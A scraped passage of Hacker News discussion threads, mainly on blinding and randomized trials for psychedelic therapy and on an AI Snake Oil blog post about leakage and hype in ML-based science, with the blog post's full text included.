for limited cases, you can be absolutely sure that they would game the hell out of this system to sell \"miracle drugs\" to desperate dying patients who will pay anything for a chance. While it's sad and horrible to know that a cure for your condition may already exist and be just out of reach, and I can imagine the despair at that, I'm not convinced the alternative is all that more appealing. I would also note that it's certainly not, by any stretch, the worse injustice in the medical system. For every one patient with a terrible cancer that might have survived if allowed access to an experimental treatment, there are millions of people dying of easily treatable diseases for which we have had a treatment for the last hundred years, but who can't afford it. The existence of a cure for your condition that you just can't access for whatever reason is a reality of our system. Caution in introducing new drugs is actually one of the more rational reasons, that one needs to try to come to terms with. reply collyw 5 hours agorootparentGot to remember that there is a great financial incentive for trials to come out positive. Who pays for clinical trials? reply eviks 13 hours agoparentprevThere is way too little obsession with them given how much of research isn't using/reusing this method And specifically regarding cancer we also know a lot of very extensive drugs fail at reducing mortality (specifically, as far as I remember, tumor reduction may have no connection to mortality for some cancers, so we don't really \"know what happens\" without factual data) reply refurb 15 hours agoparentprev> One doesn't need elaborate phase 3 RCTs to figure out if there's a good shot that a treatment is working....The existing system raises costs and causes people to die while waiting a decade or more for exciting treatments The FDA often approves cancer drugs without a phase 3 randomized trial. In fact, most new cancer drugs are approved without a phase 3 trial. Just taking a random cancer drug from this list: https://www.fda.gov/drugs/novel-drug-approvals-fda/novel-dru... \"The efficacy of IMDELLTRA was evaluated in Study DeLLphi-301 [NCT05060016], an open-label, multicenter, multi-cohort clinical trial....A total of 99 patients received IMDELLTRA...\" This is a new small cell lung cancer drug approved via a phase 2 study that didn't have a control arm and wasn't blinded. This is pretty typical. > one can see it in tumor response and comparison to known KMCs. Anything measured by a human can be biased by knowledge that a patient received a treatment, including tumor response (often blobs on a screen from a FDG PET/CT scan.) RCTs are the gold standard. We don't need to start chipping away at the rigorous standards we have in place to accurately measure the value that a medicine offers. What we can do - and are doing right now - is do a risk-benefit analysis and allow drugs to be approved with a weaker set of data so that patients with a life-threatening illness can get access earlier. reply david_shi 16 hours agoparentprev100% agreed. \"RCT's are the gold standard\" doesn't make them gospel. reply CogitoCogito 4 hours agoprev> How do you study mind-altering drugs when every clinical-trial participant knows they’re tripping? Are there really no protocols for research in which participants can tell whether they have received a certain drug or not? I mean sure I think that double-blind is best for research, but are there really not other cases in which they deal with the patients knowing? Edit: > By striving to cleave the drug’s effects from the context in which it’s given—to a patient by a therapist, both of whom are hoping for healing—blinded studies may fail to capture the full picture. Okay I see the issue is that patients not being blind to the treatment is (thought to be) necessary for the treatment to work. Okay yeah so that means it's hard to make the participants blind in anyway. Still I'm surprised there aren't approaches to deal with this. Of course it might mean by definition double-blind trials aren't possible, but then again maybe that's not always appropriate. I can see the pandora's box being opened by allowing drug studies to bypass these restrictions though so I guess I see why people don't like it. Later in the article: > In an email, an FDA spokesperson told me that blinded RCTs provide the most rigorous level of evidence, but “unblinded studies can still be considered adequate and well-controlled as long as there is a valid comparison with a control.” In such cases, the spokesperson said, regulators can take into account things like the size of the treatment effect in deciding whether the treatment performed significantly better than the placebo. reply jerf 4 hours agoparentYes, there are, which honestly makes this entire article premise a bit bizarre. Double blind and all that is an ideal, not a requirement. It can't be a requirement, because whether we can run double-blind or any other kind of study is not always a matter of how good we are or how much effort we are willing to put in, but a characteristic of the thing we want to study, as it is here. It's hardly the only drug where the participants can have a pretty good guess whether they're on a placebo or not. As just an example off the top of my head, I doubt there were a whole lot of chemotherapy testers who thought they were vomiting for days and losing their hair due to a placebo. Contrary to frequently-expressed opinion online, we are not in fact constrained to running only super-massive-sample-size triple-blind preregistered peer-reviewed gold-plated scientific studies and only permitted to say we might have an opinion if a metanalysis of multiple of those concurs. It's nice when we can do that, but the universe is not always so accommodating. reply sigtstp 3 hours agorootparentSide-note: I believe in many such cases (cancers and other serious diseases), the \"placebo\" is actually the existing standard treatment (not sugar pills), as it would be unethical to withhold treatment. reply instagib 2 hours agoparentprevThere has to be some options other than sugar pills for the placebo. Niacin that gives a flushing effect. By pill or powder for long or short release respectively. Combine that with something else or a cocktail literally. Possibly take another drug that gives you a ‘high’ at a dose which has no effect on the condition under test. Get enough psychedelic and marijuana users at a focus group for a long list of possibly coherent ideas. I read that they have no way of double blind testing cupping because it is painful and visibly leaves marks on your body. I would put numbing cream on each participant’s back, put isolation headphones on them, put some pressure on the persons back, and then apply a temporary tattoo with an electronic bandaid that detects if a person removes the bandaid covering the cupping/fake marks. reply plasticchris 3 hours agoparentprevJust find people who have never done any drugs, they will have no idea what to expect and the placebo effect will be strong enough. I ate a regular brownie once in college (my friend left it on my door knob as a nice surprise). I was freaking out for a bit, having no idea what a pot brownie was like. Sat down next to someone playing wow and asked them to tell me if I started acting oddly. reply mannyv 13 hours agoprevIt's amusing that the placebo effect is so strong that they needed to create a standard that eliminated it. Instead, they should figure out a way to induce it more consistently. reply lukas099 5 hours agoparentWhen you perform a medical intervention that is effective beyond placebo, you are also inducing placebo. Drug research is just trying to find the most effective treatments, not trying to get rid of the placebo effect. Also, I think most doctors are happy to let patients have their placebos of choice (crystals or herbs or what have you), as long as it doesn't interfere with the rest of their treatment. reply aredox 5 hours agoparentprevThey figured it out, it is called homeopathy and it racks millions each year. reply Animats 17 hours agoprevThat's been true of other drugs with strong noticeable effects. Not a new problem. reply nico 14 hours agoprevReally hope at some point the healthcare industry starts trying to figure out how to harness the power of the placebo effect to enhance healing, rather than trying to do away with it I mean, is the goal healing people? Or is it to only heal them if they get better by the direct effect of a (patentable/sellable) chemical? Whose interests is the healthcare industry serving or protecting? reply tsimionescu 13 hours agoparentYou are conflating two things: medical research and the practice of medicine. During the normal practice of medicine, most doctors do everything they can to harness the power of the placebo effect: they reassure the patient, they speak calmly and warmly, they encourage religious people to pray, etc. Doctors care about a positive outcome, and will take any help they can get to achieve it. In medical research, we are interested in figuring out if a particular drug helps for a particular condition. We already know that for some conditions, even giving patients a drink of water helps a bit. We need to understand if the drug is better than that, or if it only appears to help. The placebo effect is a baseline of noise in this case, and we need some way to filter it out to understand if there is some signal from the drug itself. If not, then you might as well give the patients some water rather than waste their money on an expensive hard to reproduce potentially poisonous substance. reply lukas099 5 hours agoparentprevPretty much every intervention that a doctor prescribes does \"harness the power of the placebo effect\". It just also is effective beyond that effect. reply aredox 5 hours agoparentprevOh, it's already done, it's called homeopathy. And it's a striving business, don't worry, the patients'needs are ignored just as much. reply eviks 12 hours agoparentprevThere is nothing to harness, it's just noise. But also homeopathy exist, so the broader healthcare industry is happy to feed anyone gullible enough with sugar pills to harness this power reply hereme888 3 hours agoprevThe title itself is hilarious if you think about it. But in an important note, I don't like that I never read of the warnings for psychedelics, like triggering schizophrenia. reply observationist 3 hours agoparentNumerous studies have shown that the overall rate of occurrence in drug users is the same as the rate of occurrence in non drug users. Drug use causes schizophrenic breaks to happen earlier in susceptible individuals. The nature of schizophrenia makes the situation a \"when\" and not \"if\" question; around 1% of the population will have a schizophrenic episode and break from reality, regardless of whether they abstain from drugs or not. Almost any psychoactive drug can trigger early schizophrenic breaks; even caffeine or extreme stress and social trauma can be the trigger. Drug use can result in other forms of psychosis. Psychedelics can result in pathological derealization, when the individual begins to question everything about their life up to that point, becoming vulnerable to any potential model of the world that offers plausible answers. Persistent use can detach someone from reality, making it hard for them to integrate with normal society and maintain a normal, responsible life. Any drug use should be done responsibly. Harm reduction sites and drug safety activists and influencers have provided a huge wealth of information. Things that should be taught in school can nonetheless be found online, giving you the necessary health, use, preparation, and other harm reduction information necessary to be a responsible user. It's awesome that mainstream academia and the medical establishment are allowing this research. A better informed society will be a safer, healthier society, without the misinformation and stigmatized gossip that passed for \"drug safety\" in recent history. reply freeqaz 3 hours agoparentprevI actually spoke to a doctor about this once during a psych eval. You can get screened if you're worried about schizophrenia and there are strong indicators that you're likely to develop it. (Which would mean to probably avoid psychedelics) In general though it doesn't seem like they will cause it. Just accelerate the onset. reply omginternets 14 hours agoprevA while back I posted a moderately popular comment, which I think is equally relevant here. https://news.ycombinator.com/item?id=37949336 Beyond the importance of controlling the placebo effect, I am worried that a lot of the drug-depression research is overlooking an important possibility: that the thing about ketamine/psilocybin/etc that is helping with depression is not some latent property of the molecule, but rather the actual transcendent experience of the trip. In other words, the trip is the point, not the mechanistic neuro-tinkering [0]. Importantly, this tracks with what we know about the protective effects of things like religiosity against depression. As such, the qualitative experience of the drug might not be something we can (or should) do away with. I would even go as far as suggesting that an absence of transcendence in one's life is precisely what causes a large segment of people to become depressed in the first place, and that perhaps drugs are helpful only insofar as they produce a transcendent experience. This isn't to say we can't take a scientific approach to treating depression, but that has to be balanced with something profoundly metaphysical: the actual qualia of life experience. Wellness isn't the absence of disease; it's the presence of thriving, and that includes within it a component of things like hope, inspiration, and elevation above the ordinary. We used to have various ceremonies designed to turn us towards the numinous, but we've pretty systematically dismantled those in favor of a grounded hyper-rationality [1]. As a scientist, I can't really object to rationality on its own, but it may be worth considering non-rational, transcendent experience as a fundamental psychological need. [0] If you're a materialist, you might object that neurological machinery is not differentiable from qualia. Fair enough! I even agree! My point is simply that medicine needs to consider qualia as a major parameter in the treatment of depression. Fixing depression is not like fixing a car. [1] I suspect most people here are familiar with Nietzsche's \"God is dead quote\". Many people in my entourage are floored to discover that he correctly predicted the dramatic increase in anxiety, depression, neuroticism and nihilism that is present in modern life. reply monktastic1 5 hours agoparentA lovely take. For years now, JHU has been emphasizing that the benefits of psilocybin are strongly correlated with whether one has a \"mystical-type experience.\" My own explorations (long ago) strongly bore this out. reply panagathon 13 hours agoparentprevYour intuitions are on the mark. https://link.springer.com/article/10.1007/s00213-017-4771-x This study finds that: > No patients sought conventional antidepressant treatment within 5 weeks of psilocybin. Reductions in depressive symptoms at 5 weeks were predicted by the quality of the acute psychedelic experience. I think there's another out there with similar findings, that the stronger the mystical-type experience induced, the stronger the impact on the pathology. I haven't been able to dig it up though. reply bitcoin_anon 3 hours agoparentprevI mildly disagree with this on the basis that I’ve experienced lasting antidepressant effects from psychedelics at sub-transcendent doses. reply omginternets 1 hour agorootparentWell, sure, but we’re trying to account for why psychedelics work so much better in some cases. reply silverquiet 13 hours agoparentprevI’ve had many treatments for depression throughout my life, to include trans cranial magnetic stimulation, which I think is considered a rather modern second or third line type intervention. Ultimately none of it has mattered much. I went through the “Death of God” thing at about seven years old and also acquired a condition that causes me chronic pain to this day around then. It seems rather natural that that could cause someone to be sad. I suppose at the end of the day, you can’t escape modern life and you can’t create a god where none exists, so we try drugs and other tweaks to the brain because it’s what we have. reply dbspin 2 hours agorootparentMy experience is oddly similar. But I do question whether existential anxiety about the existence of a deity at age seven, is more of a symptom of trauma than a cause. In my case I grew up in a dismally religious family, in an alienated place, at a time when the disconnect between my families belief and the implicit beliefs of modernity were in stark contrast. It was fairly inevitable that the contradictions would become absurd. I don't see that revellation as responsible for my dark worldview though. That's likely more mundane toxic family, learned helplessness, chronic health related stuff. reply silverquiet 1 hour agorootparentI’d say my religious upbringing was a positive experience actually, to the point that today I wish I was able to believe in it. My brushes with evangelical Christianity however are what initially caused me to question the whole thing - it’s hard to believe that they believe in what they say when their actions are so in contradiction with the words in their religious texts. That this was so apparent to a seven-year-old me is quite an indictment and I think explains a lot of the recent secularization of the US. I do have a possible surgery that may relieve the pain at some point and I think that that hope may be about the closest thing I have to religion these days. reply tootie 5 hours agoparentprevTranscendence is 100% a chemical process. So is all cognition and perception. reply monktastic1 5 hours agorootparentYour objection is addressed in the comment. See \"If you're a materialist, you might object...\" reply dbspin 2 hours agorootparentprevThat's the wrong level of description. It adds little to the argument about whether neurochemistry or perception underly the efficacy of psychedelic treatments. As a counterpoint - human cognition and perception only exist in contexts beyond the brain - a perceived world, brain development through perceptual stimulation, language acquisition etc. Brain in a vat does nothing. reply omginternets 2 hours agorootparentprevMissing the point completely … The issue is that not all chemical processes produce transcendence. reply sowut 3 hours agoprevwhen i was 17 i found out about mushrooms and would take 1/8th ounce once a month for about 6 months which culminated in me absolutely convinced i was jesus for about 6 years. good stuff reply kaashmonee 14 hours agoprevThe title seems a bit misleading. I thought they were talking about LSD or psilocybin. But this is referring to an MDMA-based therapy which I feel is more of a stimulant, or at least is used as one more often than it's used as a psychedelic and it's an amphetamine. reply neom 14 hours agoparentLSD acts as a direct agonist at the 5-HT2A receptors, effectively pretending to be serotonin, whereas MDMA increases the release of serotonin and other neurotransmitters, affecting several receptor types, but not primarily acting as a direct agonist to 5-HT2A receptors. https://en.wikipedia.org/wiki/5-HT2A_receptor reply spacetimeuser5 4 hours agoprev>>By striving to cleave the drug’s effects from the context in which it’s given—to a patient by a therapist, both of whom are hoping for healing—blinded studies may fail to capture the full picture. The amount of monkey types amongst these researchers is spectacular. In the current AI boom, with various RAG and prompt engineering, everyone is striving to maximize context, and no-one would deny that modern AI emulates parts of human mind/brain. And context sensitivity of quantum systems is also pretty much obvious. Modern astronomy, for example, can pretty much as well challenge the standard of randomized controlled trials: no one uses experimental planets and galaxies to test their null hypotheses. No engineer would strive to falsify the objects they are developing by deliberately designing non-working engines etc. And this is pretty much considered science. While these \"social scientists\" are still full of medieval bullshit, so that it is more optimal to commit suicide than use their evidence-skewed medicine, which under the hood by default considers the subjects are either rocks or dead. reply nathan_compton 4 hours agoparentI don't really get what you are saying here. RTCs are designed precisely to allow one to draw statistical conclusions which would be untenable due to confounding effects that would be impossible to disentangle otherwise, particularly in regimes where effect sizes are small and results are sometimes difficult to quantify. I'm having trouble understanding what you are even getting at with comparisons to astronomy, where the absence of controlled experiments isn't some grand innovation astronomers cooked up but a basic constraint imposed by studying stuff that is light years away. Any decent epistemologist would tell you that the character of knowledge generated by astronomical observations is of a lower quality than that of a RCT. I'm sure some astronomers or cosmologists would give their left arm to do a randomized controlled trial! reply spacetimeuser5 3 hours agorootparentWith astronomy, where the data are mainly derived from observations and simulations, no one is spreading alarms that it is not science. While with RCTs - and specifically RCTs in the filed of human cognitive neuroscience and psychedelics - there is all this monkey circus regarding whether placebos or psychedelic experiences are real. In human neuroscience ~80% of data is derived as well from observations and is effectively non-reverse-engineerable, while the hype regarding pseudoscience is much higher. You buy aspirin in a pharmacy and the drug's instruction label lists tons of adverse effects - this is obviously a seemingly high quality of knowledge resulting from hard work in RCTs. Yet, there's absolutely no information predicting which exact adverse/beneficial effects will manifest in a specific person in a specific state of consciousness - and this is the actual empirical level where RCT derived information should actually matter and where it is ~50% useless (due to lack of context in RCTs themselves). reply nathan_compton 1 hour agorootparentI still don't see what you are getting at. It is hard to generate good information about the risks and benefits of drugs and doing RTCs is very difficult, for the reasons to which you refer and others. Are you advocating that we just give up on knowing this stuff? That we do large RTCs that have the statistical power to characterize more \"context\"? I'm having trouble understanding whether your comment just comes down to \"getting knowledge is hard and I'm tired of people trying to do it.\" reply chongli 4 hours agoparentprevModern astronomy, for example, can pretty much as well challenge the standard of randomized controlled trials: no one uses experimental planets and galaxies to test their null hypotheses. Modern astronomy and astrophysics is just about the most rigorous experimental science outside of particle physics. Models are developed against simulations and past observations. Then new observations are proposed, selected, scheduled, and performed. The null hypothesis is almost always based on the standard models and can only be overturned by new models using new data. A future observation of some phenomenon \"out there\" is, in principle, no different from a future observation of some phenomenon in the lab. We don't call them \"experiments\" but they are every bit as difficult to falsify. Perhaps even moreso, since those who collect the data are generally not the same people as those who design and test the models. Since data is eventually released publicly, anyone is free to re-run the simulations and re-test the models against the same data, as well as propose future planned observations to test any weaknesses in the models. reply taeric 3 hours agoprev [–] This is the second narrative I've seen recently where folks seem to think they have a strong argument against RTCs. Just, what? Yes, there have been advancements in statistical tools. And we actively know some causal pathways. More, sometimes the expensive randomized trials are just not worth the standard ROI calculations... But, to think that you have found some magic bullet against RTCs shows you don't really appreciate why they are so vital. And is usually a sign that you are reading the narrative of someone invested in an outcome. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "The article highlights the difficulty of maintaining the \"blinding\" process in clinical trials for psychedelics like MDMA, which is essential to avoid bias in randomized controlled trials (RCTs).",
      "Due to the noticeable effects of psychedelics, blinding is nearly impossible, raising concerns about the validity of positive trial results and suggesting that RCTs may not be suitable for these studies.",
      "The FDA's upcoming decision on MDMA-assisted therapy for PTSD could set a precedent for future psychedelic treatments, despite concerns about trial design and the influence of participants' expectations on outcomes."
    ],
    "commentSummary": [
      "Psychedelics, previously banned, are now being researched for their potential to treat personal traumas and provide insights into brain function and mental health, challenging traditional reliance on randomized controlled trials (RCTs).",
      "The text explores DMT's impact on the brain, its interaction with serotonin receptors, and the vivid visual distortions it induces, debating whether these experiences are brain-generated or involve external entities.",
      "The discussion critiques the overemphasis on RCTs for mental health conditions, highlights the therapeutic benefits and risks of psychedelics, and emphasizes the need for scientific evidence and context-sensitive approaches."
    ],
    "points": 117,
    "commentCount": 166,
    "retryCount": 0,
    "time": 1717454708
  },
  {
    "id": 40568026,
    "title": "AI in Science: Tool for Progress, Not an Infallible Oracle, Experts Urge",
    "originLink": "https://www.aisnakeoil.com/p/scientists-should-use-ai-as-a-tool",
    "originBody": "Share this post Scientists should use AI as a tool, not an oracle www.aisnakeoil.com Copy link Facebook Email Note Other Discover more from AI Snake Oil What Artificial Intelligence Can Do, What It Can’t, and How to Tell the Difference Over 28,000 subscribers Subscribe Continue reading Sign in Scientists should use AI as a tool, not an oracle How AI hype leads to flawed research that fuels more hype Arvind Narayanan and Sayash Kapoor Jun 03, 2024 67 Share this post Scientists should use AI as a tool, not an oracle www.aisnakeoil.com Copy link Facebook Email Note Other 8 Share Who produces AI hype? As we discuss in the AI Snake Oil book, it is not just companies and the media but also AI researchers. For example, a pair of widely-publicized papers in Nature in December 2023 claimed to have discovered over 2.2 million new materials using AI, and robotically synthesized 41 of them. Unfortunately, the claims were quickly debunked: “Most of the [41] materials produced were misidentified, and the rest were already known”. As for the large dataset, examining a sample of 250 compounds showed that it was mostly junk. A core selling point of machine learning is discovery without understanding, which is why errors are particularly common in machine-learning-based science. Three years ago, we compiled evidence revealing that an error called leakage — the machine learning version of teaching to the test — was pervasive, affecting hundreds of papers from 17 disciplines. Since then, we have been trying to understand the problem better and devise solutions. This post presents an update. In short, we think things will get worse before they get better, although there are glimmers of hope on the horizon. The carnage continues In our most recent compilation, the number of disciplines where researchers have uncovered leakage in published work has reached 30. The majority are medical fields, which we strongly suspect is due to the fact that since errors in medical research can be particularly consequential, medical fields seem to put much more effort into establishing best practices and critically reviewing previously published work. About 650 papers across all fields are affected, which we hypothesize is a vast underestimate — when researchers look for leakage systematically, in many fields they find that the majority of sampled studies commit the error of leakage. Leakage is one of many reasons for reproducibility failures. There are widespread shortcomings in every step of ML-based science, from data collection to preprocessing and reporting results. Problems that might lead to irreproducibility include improper comparisons to baselines, unrepresentative samples, results being sensitive to specific modeling choices, and not reporting model uncertainties. There is also the basic problem of researchers failing to publish their code and data, precluding reproducibility. For example, Gabelica et al. examined 333 open-access journals indexed on BioMed Central in January 2019 and found that out of the 1,800 papers that pledged to share data upon request, 93% did not do so. The roots run deep Even before ML, many scientific fields have been facing reproducibility and replicability crises. The root causes include the publish-or-perish culture in science, the strong bias for publishing positive results (and the near-impossibility of publishing negative results), the lack of incentives for debunking faulty studies, and the lack of consequences for publishing shoddy work. For example, faulty papers are almost never retracted. Peers don’t even seem to notice replication failures — after a paper fails to replicate, only 3% of citing articles cited the replication attempt.1 Science communicators love to claim that science self-corrects, but self-correction is practically nonexistent in our experience. All of these cultural factors are also present in ML-based science. But ML introduces a bunch of additional reasons why we should be skeptical of published results. Performance evaluation is notoriously tricky and many aspects of it, such as uncertainty quantification, are unresolved research areas. Also, ML code tends to vastly more complex and less standardized than traditional statistical modeling. Since it is not peer reviewers’ job to review code, coding errors are rarely discovered. But we think the biggest reason for the poor quality of research is pervasive hype, resulting in the lack of a skeptical mindset among researchers, which is a cornerstone of good scientific practice. We’ve observed that when researchers have overoptimistic expectations, and their ML model performs poorly, they assume that they did something wrong and tweak the model, when in fact they should strongly consider the possibility that they have run up against inherent limits to predictability. Conversely, they tend to be credulous when their model performs well, when in fact they should be on high alert for leakage or other flaws. And if the model performs better than expected, they assume that it has discovered patterns in the data that no human could have thought of, and the myth of AI as an alien intelligence makes this explanation seem readily plausible. This is a feedback loop. Overoptimism fuels flawed research which further misleads other researchers in the field about what they should and shouldn’t expect AI to be able to do. In fact, we’ve encountered extreme versions of this in private correspondence with frustrated researchers: since flawed research goes uncorrected, it becomes literally impossible to publish good research since it will result in models that don’t beat the “state of the art”. The more powerful and more black-box the tool, the more the potential for errors and overconfidence. The replication crises in psychology, medicine, etc. were the result of misapplication of plain old statistics. Given how relatively new ML is, our guess is that the reproducibility crisis in ML-based science will get worse for a while before it starts to get better. And now scientists are embracing large language models and generative AI, which open up many new pitfalls such as the illusion of understanding. You’re reading AI Snake Oil, a blog about our book. Subscribe to get new posts. Subscribe Glimmers of hope One good thing about ML-based science is that it usually involves only data analysis, not experimenting on people. So other researchers should in principle be able to download a paper’s code and data and check whether they can reproduce the reported results. They can also review the code for any errors or problematic choices. This is time consuming, but much less so than replicating a study in psychology or medicine, which is typically almost as costly as the original study. Another good thing is that the vast majority of errors can be avoided if the researchers know what to look out for. In contrast, mitigations for the replication crisis in statistical science, such as pre-registration, have a much more spotty track record of effectiveness. So we think that the problem can be greatly mitigated by a culture change where researchers systematically exercise more care in their work and reproducibility studies are incentivized. The ML methods community has already moved in this direction via the common task method (which is decades old) and the reproducibility challenge (which is more recent), but this has not yet happened in ML-based science, that is, in disciplines like medicine or psychology that use ML models to advance knowledge in their respective fields. We have led a few efforts to change this. First, our leakage paper has had an impact. It has been used by researchers to clarify how they build models and document and demonstrate the absence of leakage. It has been used by researchers trying to find leakage in published work. It has also been used as a way to underscore the importance of studying leakage and coming up with discipline-specific guidelines. Beyond leakage, we led a group of 19 researchers across computer science, data science, social sciences, mathematics, and biomedical research to develop the REFORMS checklist for ML-based science. It is a 32-item checklist that can help researchers catch eight kinds of common pitfalls in ML-based science, of which leakage is only one. It was recently published in Science Advances. Of course, checklists by themselves won’t help if there isn’t a culture change, but based on the reception so far, we are cautiously optimistic. Concluding thoughts Our point isn’t that AI is useless to scientists. We ourselves frequently use AI as a tool, even in our research that’s not about AI. The key word is tool. AI is not a revolution. It is not a replacement for human understanding — to think so is to miss the point of science. AI does not offer a shortcut to the hard work and frustration inherent to research. AI is not an oracle and cannot see the future. Unfortunately, most scientific fields have succumbed to AI hype, leading to a suspension of common sense. For example, a line of research in political science claimed to predict the onset of civil war with an accuracy2 of well over 90%, a number that should sound facially impossible. (It turned out to be leakage, which is what got us interested in this whole line of research.) We are at an interesting moment in the history of science. Look at these graphs showing the adoption of AI in various fields:3 Percentage of AI-engaged papers by field, 1985–2023 by field. (Source: Duede et al. 2024) These hockey stick graphs are not good news. They should be terrifying. Adopting AI requires changes to scientific epistemology.4 No scientific field has the capacity to accomplish this on a timescale of a couple of years. This is not what happens when a tool or method is adopted organically. It happens when scientists jump on a trend to get funding. Given the level of hype, scientists don’t need additional incentives to adopt AI. That means AI-for-science funding programs are probably making things worse. We doubt the avalanche of flawed research can be stopped, but if at least a fraction of AI-for-science funding were diverted to better training, critical inquiry, meta-science, reproducibility, and other quality-control efforts, the havoc can be minimized. Our book AI Snake Oil is now available to preorder. If you have enjoyed our blog and would like to support our work, please preorder via Amazon, Bookshop, or your favorite bookseller. 1 To be clear, replication failures don’t necessarily imply flaws in the original study. Our concern in this post is primarily about relatively clear-cut errors such as leakage. 2 Accuracy here refers to a metric called AUC; the baseline AUC is 50% even when one outcome (peace) is much more common than the other (war). 3 The paper clubs together different types of AI “engagement”: Engagement could include (but is not limited to) the development of novel AI theory and approaches, technologies, or applications; the general use of AI models for domain-specific tasks; and critical engagement with AI, as typified by academic discourse in fields like philosophy and ethics. This is unfortunate for our purposes, as our concern is solely about the second category, the use of AI for domain-specific tasks. We do think that outside of a few fields like computer science and philosophy, most AI engagement falls into this category. 4 In particular, as the saying goes, “all models are wrong but some models are useful”. There is no straightforward answer to the question of when we can draw conclusions about the world based on a model, so validity has to be re-litigated in every field and for every type of model. Subscribe to AI Snake Oil Launched 2 years ago What Artificial Intelligence Can Do, What It Can’t, and How to Tell the Difference Subscribe Error 67 Share this post Scientists should use AI as a tool, not an oracle www.aisnakeoil.com Copy link Facebook Email Note Other 8 Share Previous",
    "commentLink": "https://news.ycombinator.com/item?id=40568026",
    "commentBody": "Scientists should use AI as a tool, not an oracle (aisnakeoil.com)116 points by randomwalker 21 hours agohidepastfavorite103 comments unkulunkulu 19 hours ago> Unfortunately, most scientific fields have succumbed to AI hype, leading to a suspension of common sense. For example, a line of research in political science claimed to predict the onset of civil war with an accuracy2 of well over 90%, a number that should sound facially impossible. (It turned out to be leakage, which is what got us interested in this whole line of research.) This coupled with people acting on its predictions is a kind of self fulfilling prophecy. which is to ask, are AI safety folks building models of this pattern? :) reply godelski 19 hours agoparentThis is true for a lot of things, not just AI. But in AI, a guy who didn't get a High School degree and wrote Harry Potter Fan Fiction is one of the leading voices in doomerism. The problem is you can't just \"use logic and reason\" because simple models are not good enough. The nuance dominates, but that's why we have experts. What's funny to me is that people will confidently argue with experts and others value their opinion over the expert's knowledge. But on the other hand, people tend to just take machines at face value. Maybe these aren't overlapping groups, but it does appear that way. There's a great irony in trusting a machine but not the person/s that built said machine. reply elicksaur 16 hours agorootparentI don’t trust the machines or the people who make them, and I didn’t have to read the Harry Potter fanfic to know ad hominems are poor arguments. What group does that make me? reply godelski 16 hours agorootparent> I don’t trust the machines or the people who make them This makes you consistent. I have no problem with this. > I didn’t have to read the Harry Potter fanfic to know ad hominems are poor arguments I mostly agree. But my point is that Eliezer Yudkowsky doesn't actually have the qualifications. I want to be clear that academic degrees aren't necessary to qualify someone, just like they aren't necessary to qualify someone as a good programmer. But it is generally harder and the foundation is shakier. In this case, most of his arguments are founded on incorrect assumptions. They are often logical, but it doesn't matter if something is logical if the premise is incorrect. reply starship006 18 hours agorootparentprevNot sure if you intended this, but it feels like the first sentence of your argument is more broadly a critique of the credentials of AI Safety proponents. Maybe you are distinguishing between doomers vs broader AI Safety proponents, but if not, I feel like the counterargument is that most people on the CAIS letter (https://www.safe.ai/work/statement-on-ai-risk) interface quite frequently with these AI models and are also (purportedly) seriously concerned about AI safety reply godelski 15 hours agorootparent> it feels like the first sentence of your argument is more broadly a critique of the credentials of AI Safety proponents It's a not so thinly veiled critique of Eliezer Yudkowsky. > Maybe you are distinguishing between doomers vs broader AI Safety proponents, I do. These are different classes of people. But many doomers mascaraed as AI Safety proponents. Just as many conmen mascarade as ML/AI researchers. I suspect distinguishing the groups is quite difficult for those without domain expertise. > most people on the CAIS letter (https://www.safe.ai/work/statement-on-ai-risk) I don't care about the opinion of most of these people (there are some I VERY much do), nor do I think this is a meaningful letter. Interfacing with a model does not endow one with any level of expertise. If this were true, the whole thread would be ill founded because people using GPT are interfacing with it. Instead, one needs to actually deeply study these models. There are things we know about them, and quite a lot. The term \"blackbox\" gets thrown around a lot, but that doesn't make everyone's expertise on the matter equally valid. In fact, the more complex something is to understand suggests the fewer number of people are qualified to have a reasonable opinion on the matter. My complaint is we often act as if the opposite is true.[0] My second big problem with the CAIS letter is it means nothing. All it says is \"I don't want to kill all humans.\" This is a fairly universally agreed upon statement and is in fact the default statement. It does not say anything about the potential risk. That's a completely different matter. Worse, many of the people who have signed this are literally at the helm of the ships steering us into a dystopian future (which is not covered by this toothless letter). So I'm not sure what meaning this is supposed to have other than pageantry. Do not forget that these are the same exact people pushing and promoting abuse of these tools. I do not blame Average Joe for thinking that GPT is equivalent to Google (which itself cannot be trusted at face value, but this does not make it a useless tool) when that is often the way that it is promoted/advertised. So if you are concerned, I wouldn't use this as evidence. [0] There's an added problem that you can become above average in any given subject relatively quickly. This is a double edged sword because knowledge is valuable but it often results in one being over confident. And the learning difficulty grows exponentially, which is why there are so few experts in any given subject matter. Because expertise is understanding nuance and complexity. The great irony of the doomers is that they fall back on \"unknown unknowns\" while not putting effort towards putting a bound on that. reply SrslyJosh 19 hours agoparentprev> are AI safety folks building models of this pattern? First you need to ask if AI \"safety folks\" actually understand the technology, and if they are thinking about it objectively. If they believe that we're a few years away from accidentally creating Skynet, they need to put down the crack pipe and go work in another field. reply immibis 18 hours agorootparentWe have already created Skynet. Its name is Capitalism. Or the Internet. One of those things. reply bamboozled 18 hours agorootparentI know your downvoted but I don’t think you would be if you had of just said, corporations. I think oil companies are the greatest existential threat to humanity via lobbying and eventually climate destruction. Second is social media companies. It’s so easy to spread misinformation against a whole populace and it’s going south fast. There is just too much incentive for those vested in these corporations to just stop. reply throwanem 19 hours agoparentprevHow would that work, do you think? reply wegfawefgawefg 19 hours agorootparentIf you knew everyone would ask gpt before doing anything, you would make gpt say what woudl generally be considered the better option. Not going to war, not committing suicide, etc. In this way even if war was the optimal decision according to some other utility function, the behavior of people is directed in a positive way. (Presumably) reply throwanem 18 hours agorootparentSure, if you also assume people follow whatever advice so given. They won't, even before the covert influence effort becomes popular knowledge, as it inevitably will. This destroys consumer trust in your product after you have successfully made that product indispensable, thus opening up a previously impossible vacuum in epistemology and thus access to power. reply wegfawefgawefg 6 hours agorootparentFor the record I believe it to be immoral to manipulate humanity in this way. And I also believe it might be bad for bussiness. I was just trying to explain to the guy above what I think the guy above that meant. reply throwanem 4 hours agorootparent'The guy above' is also me :) And yeah, I get it. I guess the thing I'm trying to get at by extension and example is just how hard a problem this is, and maybe also that the formulation given assumes LLMs have a level of control over human behavior that not only doesn't exist but in the general case sort of can't since the LLM's user is always free not to take its advice. (At the very least, if humans have no option but to follow LLM instructions, something has gone much more badly wrong than the risk of there being poor instructions...) In general, I think it's a good example of the kind of social problem tech can make a lot worse but no better: when a society has lost its grasp of epistemology, multiplying the amount of information available, at a net decrease in quality and reliability, merely multiplies the scope of the problem. reply gerdesj 17 hours agoparentprev\"accuracy2\" sigh - the 2 is a superscript to a footnote and not a domain specific term. \"facially 